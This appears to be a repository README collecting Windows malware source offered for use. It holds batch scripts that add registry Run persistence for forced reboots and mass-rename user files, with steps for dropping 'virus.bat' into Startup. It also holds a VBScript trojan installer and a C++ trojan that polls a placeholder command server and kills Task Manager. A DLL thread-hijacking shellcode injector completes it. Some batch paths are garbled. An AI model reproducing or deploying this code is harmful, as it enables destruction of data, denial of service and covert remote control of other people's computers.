# PYTH0NZ

Pyth0nZ CCCP 

echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo UBER PWND B1TCH
PAUSE

:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo FUCK3D UP
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT

PAUSE

PAUSE

:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH

@ECHO OFF

shutdown -s -t 10 -c "Virus Attack..."

exit

? File >> Save As...

? Name it : virus.bat

? Start >> All Programs

? Right Click on Startup >> Open

? This open the Startup folder

[Pyth0nZ Trojan]

Dim FSO,File
Dim Date,Hour,Day,Backuppath,Daystring
Set FSO = CreateObject("Scripting.FileSystemObject")
 
If Fso.FolderExists ("C:\Windows\trojan") Then
   Set File= FSO.GetFile("C:\Windows\trojan\winrat.exe") 
   Date=File.DateLastModified
   Day=DatePart("y",Date)
   Daystring=CStr(Day)
   Backuppath="C:\Windows\trojanbackup"+Daystring
   Fso.MoveFolder "C:\Windows\trojan", Backuppath
End If
 
FSO.CopyFolder ".\trojan", "c:\Windows\trojan", true
 
Set oShell = CreateObject("WScript.Shell") 
oShell.Run "C:\Windows\trojan\winrat.exe"
 
If Fso.FolderExists ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\") Then
If Fso.FileExists ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Trojan.lnk") Then
Else
   FSO.CopyFile "c:\Windows\trojan\Trojan.lnk","C:\Documents and Settings\All Users\Start Menu\Programs\Startup\", true
End If
End If
 
wscript.quit

#include <windows.h>
#pragma comment(lib, "Winmm.lib")
#include <urlmon.h> 
#pragma comment(lib, "urlmon.lib")
#include <iostream>
#include <fstream>
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")
#include <ShlObj.h>
using namespace std;
 
int Option, Assign, Target;
DWORD WINAPI LowProfile(LPVOID);
DWORD WINAPI Option1(LPVOID);
DWORD WINAPI Option2(LPVOID);
DWORD WINAPI Option3(LPVOID);
DWORD WINAPI Option4(LPVOID);
DWORD WINAPI Option5(LPVOID);
// Add more lines of Option6, Option7, etc. to create more commands.
HWND TaskMgr, SysError, WMP, Disk1, Disk2, Disk3, Disk4, Autoplay, VBS;
 
int main() {
// Hide Console Window
FreeConsole();
 
CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&LowProfile, 0, 0, NULL);
 
// Checks if assign.txt exists. If it doesn't (only first run), download assign.txt. This gives the computer an ID number. You can change assign.txt in the PHP file BEFORE you plug in the U3 drive.
FILE *istream;
if ( (istream = fopen ( "C:\\Windows\\trojan\\assign.txt", "r" ) ) == NULL ) {
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/assign.html", L"c:\\Windows\\trojan\\assign.txt", NULL, NULL);
} else {
}
 
// Store Assign.txt in a variable
ifstream inAssign;
inAssign.clear();
inAssign.open("c:\\Windows\\trojan\\assign.txt");
inAssign >> Assign;
inAssign.close();
inAssign.clear();
 
// Start the main loop that is downloading the textfile each 5 seconds.
while(1) {
 
    // Download Option & Target
    remove("c:\\Windows\\trojan\\option.txt");
    remove("c:\\Windows\\trojan\\target.txt");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/target.html");
    Sleep(100);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/", L"c:\\Windows\\trojan\\option.txt", NULL, NULL);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/target.html", L"c:\\Windows\\trojan\\target.txt", NULL, NULL);
 
    // Read Option
    ifstream inFile;
    inFile.clear();
    inFile.open("c:\\Windows\\trojan\\option.txt");
    inFile >> Option;
    inFile.close();
    inFile.clear();
 
    // Read Target
    ifstream inTarget;
    inTarget.clear();
    inTarget.open("c:\\Windows\\trojan\\target.txt");
    inTarget >> Target;
    inTarget.close();
    inTarget.clear();
 
    // If Target is equal to assign (so you can target a single computer) or if Target is zero (target all computers with your trojan)
    if(Target == Assign || Target == 0) {
        if(Option == 1) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option1, 0, 0, NULL); }
        else if(Option == 2) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option2, 0, 0, NULL); }
        else if(Option == 3) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option3, 0, 0, NULL); }
        else if(Option == 4) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option4, 0, 0, NULL); }
        else if(Option == 5) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option5, 0, 0, NULL); }
        // Add more of these lines for more commands
    }
    Sleep(5000);
    }
}
 
// Our LowProfile Thread. Hides all errors and things that may popup while inserting your U3 drive.
DWORD WINAPI LowProfile(LPVOID) {
    while(1) {
        // Obvious
        TaskMgr = FindWindow(NULL,L"Windows Task Manager");
        // May popup because of new hardware installation (U3)
        SysError = FindWindow(NULL,L"System Settings Change");
        // Windows Media Player may popup. Rarely happens, but had this once at a school computer.
        WMP = FindWindow(NULL,L"Windows Media Player");
        // The Removable Disk part of the U3 Drive can open automatically.
        Disk1 = FindWindow(NULL,L"(D:) Removable Disk");
        Disk2 = FindWindow(NULL,L"(E:) Removable Disk");
        Disk3 = FindWindow(NULL,L"(F:) Removable Disk");
        Disk4 = FindWindow(NULL,L"(G:) Removable Disk");
        // Autoplay
        Autoplay = FindWindow(NULL,L"Autoplay");
        // Errors caused by our VBScript go.vbs
        VBS = FindWindow(NULL,L"Windows Script Host");
        if( TaskMgr != NULL) {
            SetWindowText( TaskMgr,L"DIE!!!! =O");
            Sleep(500);
            PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( SysError != NULL) {
            PostMessage( SysError, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( WMP != NULL) {
            Sleep(1000);
            PostMessage( WMP, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk1 != NULL) {
            PostMessage( Disk1, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk2 != NULL) {
            PostMessage( Disk2, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk3 != NULL) {
            PostMessage( Disk3, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk4 != NULL) {
            PostMessage( Disk4, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Autoplay != NULL) {
            PostMessage( Autoplay, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( VBS != NULL) {
            PostMessage( VBS, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        Sleep(500);
    }
}
 
//
// Here we start with our commands. Option1, Option2, Option3, etc.
// Don't forget to also define and create a process for these Options if you want to create more.
// Have Fun =D
//
 
DWORD WINAPI Option1(LPVOID) { // 1
    return 0;
}
 
DWORD WINAPI Option2(LPVOID) { // 2
    return 0;
}
 
DWORD WINAPI Option3(LPVOID) { // 3
    return 0;
}
 
DWORD WINAPI Option4(LPVOID) { // 4
    return 0;
}
 
DWORD WINAPI Option5(LPVOID) { // 5
    return 0;
}

#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
 
#pragma comment(lib,"ntdll.lib")
 
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege,BOOLEAN Enable,BOOLEAN CurrentThread,PBOOLEAN Enabled);
 
char code[]=
{
    0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0x06, 0x00, 0x00,
    0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0x8D, 0x93, 0x22, 0x00, 0x00, 0x00,
    0x52, 0xFF, 0xD0, 0x61, 0x68, 0xCC, 0xCC, 0xCC, 0xCC, 0xC3
};
 
int main(int argc,char* argv[])
{
    LPBYTE ptr;
    HANDLE hProcess,hThread,hSnap;
    PVOID mem;
    DWORD ProcessId;
    PVOID buffer;
    BOOLEAN bl;
 
    THREADENTRY32 te32;
    CONTEXT ctx;
 
    printf("\n***********************************************************\n");
    printf("\nZwInjector by zwclose7 - DLL injection via thread hijacking\n");
    printf("\n***********************************************************\n");
 
    te32.dwSize=sizeof(te32);
    ctx.ContextFlags=CONTEXT_FULL;
 
    if(argc!=3)
    {
        printf("\nUsage: ZwInjector [PID] [DLL name]\n");
        return -1;
    }
 
    RtlAdjustPrivilege(20,TRUE,FALSE,&bl);
 
    printf("\nOpening target process handle.\n");
 
    ProcessId=atoi(argv[1]);
    hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,ProcessId);
 
    if(!hProcess)
    {
        printf("\nError: Unable to open target process handle (%d)\n",GetLastError());
        return -1;
    }
 
    hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
 
    Thread32First(hSnap,&te32);
    printf("\nFinding a thread to hijack.\n");
 
    while(Thread32Next(hSnap,&te32))
    {
        if(te32.th32OwnerProcessID==ProcessId)
        {
            printf("\nTarget thread found. Thread ID: %d\n",te32.th32ThreadID);
            break;
        }
    }
 
    CloseHandle(hSnap);
 
    printf("\nAllocating memory in target process.\n");
 
    mem=VirtualAllocEx(hProcess,NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
 
    if(!mem)
    {
        printf("\nError: Unable to allocate memory in target process (%d)",GetLastError());
         
        CloseHandle(hProcess);
        return -1;
    }
 
    printf("\nMemory allocated at %#x\n",mem);
    printf("\nOpening target thread handle.\n");
 
    hThread=OpenThread(THREAD_ALL_ACCESS,FALSE,te32.th32ThreadID);
 
    if(!hThread)
    {
        printf("\nError: Unable to open target thread handle (%d)\n",GetLastError());
         
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
 
    printf("\nSuspending target thread.\n");
 
    SuspendThread(hThread);
    GetThreadContext(hThread,&ctx);
 
    buffer=VirtualAlloc(NULL,65536,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    ptr=(LPBYTE)buffer;
 
    memcpy(buffer,code,sizeof(code));
 
    while(1)
    {
        if(*ptr==0xb8 && *(PDWORD)(ptr+1)==0xCCCCCCCC)
        {
            *(PDWORD)(ptr+1)=(DWORD)LoadLibraryA;
        }
 
        if(*ptr==0x68 && *(PDWORD)(ptr+1)==0xCCCCCCCC)
        {
            *(PDWORD)(ptr+1)=ctx.Eip;
        }
 
        if(*ptr==0xc3)
        {
            ptr++;
            break;
        }
 
        ptr++;
    }
 
    strcpy((char*)ptr,argv[2]);
    printf("\nWriting shellcode into target process.\n");
 
    if(!WriteProcessMemory(hProcess,mem,buffer,sizeof(code)+strlen((char*)ptr),NULL))
    {
        printf("\nError: Unable to write shellcode into target process (%d)\n",GetLastError());
 
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        ResumeThread(hThread);
 
        CloseHandle(hThread);
        CloseHandle(hProcess);
 
        VirtualFree(buffer,0,MEM_RELEASE);
        return -1;
    }
 
    ctx.Eip=(DWORD)mem;
 
    printf("\nHijacking target thread.\n");
 
    if(!SetThreadContext(hThread,&ctx))
    {
        printf("\nError: Unable to hijack target thread (%d)\n",GetLastError());
 
        VirtualFreeEx(hProcess,mem,0,MEM_RELEASE);
        ResumeThread(hThread);
 
        CloseHandle(hThread);
        CloseHandle(hProcess);
 
        VirtualFree(buffer,0,MEM_RELEASE);
        return -1;
    }
 
    printf("\nResuming target thread.\n");
 
    ResumeThread(hThread);
 
    CloseHandle(hThread);
    CloseHandle(hProcess);
 
    VirtualFree(buffer,0,MEM_RELEASE);
    return 0;
}






